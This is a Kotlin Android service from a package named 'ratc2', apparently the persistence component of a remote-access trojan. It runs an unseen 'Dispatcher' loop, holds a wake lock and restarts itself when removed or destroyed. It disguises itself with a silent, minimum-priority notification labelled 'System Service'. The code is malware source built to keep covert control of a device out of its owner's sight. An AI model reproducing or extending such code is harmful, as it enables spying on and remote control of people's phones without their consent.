package com.spud.ratc2

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat

class SyncService : Service() {
    private var thread: Thread? = null
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        acquireWakeLock()
        createChannel()
        startForeground(1, notif())
        val d = Dispatcher(applicationContext)
        thread = Thread {
            while (!Thread.currentThread().isInterrupted) {
                try { d.loop() }
                catch (e: Throwable) {
                    try { Thread.sleep(1000) } catch (_: Exception) { break }
                }
            }
        }.also { it.isDaemon = false; it.start() }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restart = Intent(applicationContext, SyncService::class.java)
        val pi = PendingIntent.getService(
            this, 1, restart,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarm.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, pi)
        super.onTaskRemoved(rootIntent)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        releaseWakeLock()
        try {
            val restart = Intent(applicationContext, SyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                applicationContext.startForegroundService(restart)
            else applicationContext.startService(restart)
        } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ratc2::sync")
            wakeLock?.acquire(60 * 60 * 1000L)
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try { wakeLock?.release() } catch (_: Exception) {}
        wakeLock = null
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel("bg", "Background", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
    }

    private fun notif(): Notification =
        NotificationCompat.Builder(this, "bg")
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
}
